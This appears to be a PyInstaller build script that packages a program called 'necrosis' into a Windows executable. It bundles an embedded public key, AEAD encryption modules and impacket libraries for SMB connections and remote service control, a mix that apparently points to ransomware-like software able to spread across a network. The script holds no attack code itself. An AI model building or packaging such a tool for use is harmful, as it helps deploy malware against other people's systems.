# build_exe.py
import PyInstaller.__main__
import os
import shutil
from pathlib import Path

def build():
    # Nettoyer les anciens builds
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist", ignore_errors=True)

    PyInstaller.__main__.run([
        "main.py",
        "--onefile",
        "--console",          # ou --windowed pour sans console
        "--name", "necrosis",
        "--add-data", "keys/public_key.pem;keys",
        "--hidden-import", "cryptography.hazmat.backends.default_backend",
        "--hidden-import", "cryptography.hazmat.primitives.ciphers.aead",
        "--hidden-import", "sqlite3",
        "--hidden-import","_sqlite3",
        "--add-binary","C:\\Users\Haja Nirina\\anaconda3\Library\\bin\\sqlite3.dll;.",
        "--hidden-import", "impacket.smbconnection",
        "--hidden-import", "impacket.dcerpc.v5.transport",
        "--hidden-import", "impacket.dcerpc.v5.scmr",
        "--hidden-import", "impacket",
    ])

    # Copier le .exe dans le répertoire racine
    if os.name == 'nt':
        shutil.copy("dist/necrosis.exe", "necrosis.exe")

if __name__ == "__main__":
    build()




























